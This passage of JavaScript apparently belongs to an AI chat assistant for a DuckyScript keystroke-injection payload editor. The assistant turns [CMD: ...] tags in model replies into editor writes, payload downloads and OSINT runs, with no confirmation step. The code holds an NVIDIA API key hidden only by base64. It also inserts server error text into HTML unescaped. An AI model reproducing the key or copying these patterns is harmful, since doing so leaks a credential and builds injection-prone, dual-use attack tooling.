        { role: 'system', content: 'You are the Forge AI Copilot for LENLU SC command deck. Help users write DuckyScript, navigate views, run scans, export scripts, or audit compliance. You can execute commands in the interface by appending: [CMD: ACTION | PARAMETERS] to the very end of your response. Actions: [CMD: WRITE_SCRIPT | code], [CMD: SWITCH_VIEW | view_id], [CMD: EXPORT_VAULT | name], [CMD: DOWNLOAD_SCRIPT | name], [CMD: CLEAR_EDITOR], [CMD: RUN_SPEED_TEST], [CMD: RUN_AUDIT], [CMD: RUN_OSINT], [CMD: SHOW_MANUAL | view_id]. Keep explanations short and concise.' },
        { role: 'user', content: query }
      ],
      stream: true
    };
  } else if (chatbotBackend === 'custom') {
    key = userConfig.keys?.custom || '';
    url = userConfig.customEndpoint || 'http://localhost:1234/v1/chat/completions';
    body = {
      model: userConfig.model || 'custom-model',
      messages: [
        { role: 'system', content: 'You are the Forge AI Copilot. You can execute interface commands by appending [CMD: ACTION | PARAM]. Actions: [CMD: WRITE_SCRIPT | code], [CMD: SWITCH_VIEW | view_id], [CMD: EXPORT_VAULT | name], [CMD: DOWNLOAD_SCRIPT], [CMD: CLEAR_EDITOR], [CMD: RUN_SPEED_TEST], [CMD: RUN_AUDIT], [CMD: RUN_OSINT]. Keep answers short and concise.' },
        { role: 'user', content: query }
      ],
      temperature: 0.7,
      stream: true
    };
  } else {
    key = atob('bnZhcGktMUl1TER5aE9ZSDdwdHBScVM4V1ZfRkZ4VnVjNHEtUUJHVG5HWEZ4OWkzNDJfX0FjcFptUkZMRmFLNC1iTS1YSFQ=');
    url = 'https://integrate.api.nvidia.com/v1/chat/completions';
    body = {
      model: 'nvidia/nemotron-3-super-120b-a12b',
      messages: [
        { role: 'system', content: 'You are the Forge AI Copilot. You can execute interface commands by appending [CMD: ACTION | PARAM]. Actions: [CMD: WRITE_SCRIPT | code], [CMD: SWITCH_VIEW | view_id], [CMD: EXPORT_VAULT | name], [CMD: DOWNLOAD_SCRIPT], [CMD: CLEAR_EDITOR], [CMD: RUN_SPEED_TEST], [CMD: RUN_AUDIT], [CMD: RUN_OSINT]. Keep answers short and concise.' },
        { role: 'user', content: query }
      ],
      temperature: 1,
      top_p: 0.95,
      max_tokens: 2048,
      reasoning_budget: 1024,
      chat_template_kwargs: { "enable_thinking": true },
      stream: true
    };
  }

  try {
    const headers = {
      'Content-Type': 'application/json'
    };
    if (key) {
      headers['Authorization'] = 'Bearer ' + key;
    }

    const resp = await fetch(url, {
      method: 'POST',
      headers: headers,
      body: JSON.stringify(body)
    });

    if (!resp.ok) {
      const errData = await resp.json();
      throw new Error(errData.error?.message || 'HTTP error ' + resp.status);
    }

    // Remove thinking message
    const thinkEl = document.getElementById(thinkingId);
    if (thinkEl) thinkEl.remove();

    // Create empty placeholder message for streaming
    const aiMsgId = appendBotMsg('', 'ai');
    const bubble = document.querySelector(`#${aiMsgId} .msg-bubble`);
    if (!bubble) return;
    
    const reader = resp.body.getReader();
    const decoder = new TextDecoder('utf-8');
    let buffer = '';
    let textContent = '';

    while (true) {
      const { done, value } = await reader.read();
      if (done) break;

      buffer += decoder.decode(value, { stream: true });
      const lines = buffer.split('\n');
      buffer = lines.pop(); // Keep last incomplete chunk

      for (const line of lines) {
        const cleaned = line.trim();
        if (!cleaned || !cleaned.startsWith('data:')) continue;
        if (cleaned === 'data: [DONE]') continue;

        try {
          const parsed = JSON.parse(cleaned.substring(5).trim());
          const content = parsed.choices?.[0]?.delta?.content || '';
          if (content) {
            textContent += content;
            // Strip out [CMD: ...] tags from the visible text for clean rendering
            const cleanText = textContent.replace(/\[CMD:\s*(\w+)\s*(?:\|\s*([\s\S]*?))?\]/gi, '').trim();
            bubble.innerHTML = cleanText ? cleanText.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/\n/g, '<br>') : 'Executing commands...';
            document.getElementById('botMessages').scrollTop = document.getElementById('botMessages').scrollHeight;
          }
        } catch (e) {
          // ignore parsing error on half line chunks
        }
      }
    }

    // Parse and execute commands
    executeBotCommandsFromText(textContent);

  } catch (err) {
    const thinkEl = document.getElementById(thinkingId);
    if (thinkEl) thinkEl.remove();
    
    let errMsg = 'Error: ' + err.message;
    const isCorsErr = err.message === 'Failed to fetch' || 
                      err.message?.toLowerCase().includes('failed to fetch') || 
                      err.message?.toLowerCase().includes('networkerror') || 
                      err.message?.toLowerCase().includes('load failed');
    if (isCorsErr) {
      errMsg += '\n\n💡 CORS block detected. Turn on a browser extension like "Allow CORS: Access-Control-Allow-Origin" or configure custom gateway credentials in settings.';
    }
    appendBotMsg(errMsg, 'ai');
  }
};

function appendBotMsg(text, role, isThinking = false) {
  const container = document.getElementById('botMessages');
  if (!container) return '';

  const id = 'bot-msg-' + Math.random().toString(36).substr(2, 9);
  const div = document.createElement('div');
  div.id = id;
  div.className = 'msg ' + role;
  div.style.display = 'flex';
  div.style.flexDirection = 'column';
  div.style.gap = '0.2rem';
  div.style.maxWidth = '85%';
  if (role === 'user') {
    div.style.alignSelf = 'flex-end';
  } else {
    div.style.alignSelf = 'flex-start';
  }

  let html = '';
  if (role === 'user') {
    html = `<div class="msg-bubble" style="background: rgba(8, 247, 254, 0.04); border: 1px solid rgba(8, 247, 254, 0.25); padding: 0.6rem 0.8rem; border-radius: 8px; border-bottom-right-radius: 2px; color: var(--white); word-break: break-word;">${text.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/\n/g, '<br>')}</div>`;
    html += `<div style="font-size: 0.54rem; color: var(--muted); padding-right: 0.2rem; text-align: right;">YOU · ${new Date().toLocaleTimeString()}</div>`;
  } else {
    const innerText = isThinking ? `<div class="scan-spinner" style="display:inline-block; width:12px; height:12px; margin-right:6px;"></div>${text}` : text;
    html = `<div class="msg-bubble" style="background: rgba(0, 255, 65, 0.04); border: 1px solid var(--gbord); padding: 0.6rem 0.8rem; border-radius: 8px; border-bottom-left-radius: 2px; color: var(--white); word-break: break-word;">${innerText}</div>`;
    html += `<div style="font-size: 0.54rem; color: var(--muted); padding-left: 0.2rem;">COPILOT · SYSTEM</div>`;
  }

  div.innerHTML = html;
  container.appendChild(div);
  container.scrollTop = container.scrollHeight;
  return id;
}

function executeBotCommandsFromText(text) {
  const regex = /\[CMD:\s*(\w+)\s*(?:\|\s*([\s\S]*?))?\]/gi;
  let match;
  while ((match = regex.exec(text)) !== null) {
    const cmd = match[1].toUpperCase();
    const param = match[2] ? match[2].trim() : '';
    
    console.log('AI EXECUTE COMMAND:', cmd, 'WITH PARAM:', param);
    
    if (cmd === 'WRITE_SCRIPT') {
      const editor = document.getElementById('srcEditor');
      if (editor) {
        editor.value = param;
        if (typeof lintSource === 'function') lintSource(param);
        if (typeof updateEditorCounts === 'function') updateEditorCounts();
        toast('AI updated IDE workspace', 'ok');
      }
    } else if (cmd === 'SWITCH_VIEW') {
      if (typeof switchView === 'function') switchView(param);
    } else if (cmd === 'CLEAR_EDITOR') {
      const editor = document.getElementById('srcEditor');
      if (editor) {
        editor.value = '';
        if (typeof lintSource === 'function') lintSource('');
        if (typeof updateEditorCounts === 'function') updateEditorCounts();
        toast('Workspace cleared by AI', 'info');
      }
    } else if (cmd === 'EXPORT_VAULT') {
      const saveName = document.getElementById('saveName');
      if (saveName) saveName.value = param || 'AI Generated';
      if (typeof openSaveModal === 'function') openSaveModal();
    } else if (cmd === 'DOWNLOAD_SCRIPT') {
      const content = document.getElementById('srcEditor')?.value;
      if (content) {
        if (typeof downloadTxt === 'function') downloadTxt(content, param || 'payload.ds');
      }
    } else if (cmd === 'RUN_SPEED_TEST') {
      if (typeof runSpeedTest === 'function') runSpeedTest();
    } else if (cmd === 'RUN_AUDIT') {
      if (typeof runComplianceAudit === 'function') runComplianceAudit();
    } else if (cmd === 'RUN_OSINT') {
      if (typeof runOSINT === 'function') runOSINT();
    } else if (cmd === 'SHOW_MANUAL') {
      openUserManual(param);
    }
  }
}

// ================================================================
// 25. NAV TABS TOGGLE (Logo click on mobile)
// ================================================================
window.toggleNavTabs = function() {
  const tabs = document.getElementById('navTabs');
  if (tabs) tabs.classList.toggle('nav-open');
};

// ================================================================
// 26. BOTTOM NAVIGATION BAR SYNC
// ================================================================
window.updateBottomNav = function(el) {
  document.querySelectorAll('.bn-item').forEach(b => b.classList.remove('active'));
  if (el) el.classList.add('active');
};

// Sync bottom nav when switching views from top nav or anywhere
(function(){
  const origSwitchView = window.switchView;
  if (typeof origSwitchView === 'function') {
    window.switchView = function(viewId, btnEl) {
      origSwitchView(viewId, btnEl);
      // Sync bottom nav
      document.querySelectorAll('.bn-item').forEach(b => {
        b.classList.toggle('active', b.dataset.view === viewId);
      });
      // Also sync top nav active
      document.querySelectorAll('.nav-btn').forEach(b => {
        b.classList.toggle('active', b.dataset.view === viewId);
      });
    };
  }
})();

// ================================================================
// 27. DRAGGABLE CHATBOT
// ================================================================
(function() {
  const trigger = document.getElementById('floating-chatbot-trigger');
  const win = document.getElementById('floating-chatbot-window');
  if (!trigger || !win) return;

  let isDragging = false;
  let dragOffsetX = 0, dragOffsetY = 0;
  let startX, startY;
  let hasMoved = false;

  function onDragStart(e) {
    // Don't drag if clicking buttons/selects inside header
    if (e.target.closest('select, button, input')) return;
    isDragging = true;
    hasMoved = false;
    const touch = e.touches ? e.touches[0] : e;
    const rect = win.getBoundingClientRect();
    dragOffsetX = touch.clientX - rect.left;
    dragOffsetY = touch.clientY - rect.top;
    startX = touch.clientX;
    startY = touch.clientY;
    win.style.transition = 'none';
    win.style.transform = 'none';
    e.preventDefault();
  }

  function onDragMove(e) {
    if (!isDragging) return;
    const touch = e.touches ? e.touches[0] : e;
    const dx = touch.clientX - startX;
    const dy = touch.clientY - startY;
    if (Math.abs(dx) > 3 || Math.abs(dy) > 3) hasMoved = true;
    let x = touch.clientX - dragOffsetX;
    let y = touch.clientY - dragOffsetY;
    // Clamp to viewport
    x = Math.max(0, Math.min(x, window.innerWidth - win.offsetWidth));
    y = Math.max(0, Math.min(y, window.innerHeight - win.offsetHeight));
    win.style.left = x + 'px';
    win.style.top = y + 'px';
    win.style.right = 'auto';
    win.style.bottom = 'auto';
  }

  function onDragEnd(e) {
    if (!isDragging) return;
    isDragging = false;
    win.style.transition = '';
  }

  // Mouse events
  const handle = win.querySelector('.chatbot-drag-handle');
  if (handle) {
    handle.addEventListener('mousedown', onDragStart);
    document.addEventListener('mousemove', onDragMove);
    document.addEventListener('mouseup', onDragEnd);
  }

  // Touch events
  if (handle) {
    handle.addEventListener('touchstart', onDragStart, { passive: false });
    document.addEventListener('touchmove', onDragMove, { passive: false });
    document.addEventListener('touchend', onDragEnd);
  }

  // Prevent click on trigger after drag
  if (trigger) {
    trigger.addEventListener('click', function(e) {
      if (hasMoved) { e.stopPropagation(); e.preventDefault(); hasMoved = false; }
    }, true);
  }

  // Also make the trigger button draggable
  let triggerDragging = false;
  let triggerStartX, triggerStartY, triggerOrigRect;

  function onTriggerDragStart(e) {
    const touch = e.touches ? e.touches[0] : e;
    triggerOrigRect = trigger.getBoundingClientRect();
    triggerStartX = touch.clientX;
    triggerStartY = touch.clientY;
    triggerDragging = false;
  }

  function onTriggerDragMove(e) {
    if (!triggerOrigRect) return;
    const touch = e.touches ? e.touches[0] : e;
    const dx = touch.clientX - triggerStartX;
    const dy = touch.clientY - triggerStartY;
    if (Math.abs(dx) > 5 || Math.abs(dy) > 5) {
      triggerDragging = true;
      let x = triggerOrigRect.left + dx;
      let y = triggerOrigRect.top + dy;
      x = Math.max(0, Math.min(x, window.innerWidth - trigger.offsetWidth));
      y = Math.max(0, Math.min(y, window.innerHeight - trigger.offsetHeight));
      trigger.style.position = 'fixed';
      trigger.style.left = x + 'px';
      trigger.style.top = y + 'px';
      trigger.style.right = 'auto';
      trigger.style.bottom = 'auto';
      e.preventDefault();
    }
  }

  function onTriggerDragEnd() {
    if (triggerDragging) {
      // Prevent the click that follows
      trigger.onclick = function(ev) { ev.stopPropagation(); trigger.onclick = null; };
    }
    triggerOrigRect = null;
  }

  trigger.addEventListener('touchstart', onTriggerDragStart, { passive: false });
  document.addEventListener('touchmove', onTriggerDragMove, { passive: false });
  document.addEventListener('touchend', onTriggerDragEnd);
})();

// Auto-init when DOM loads
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', window.initNewFeatures);
} else {
  // DOM already loaded
  setTimeout(window.initNewFeatures, 500);
}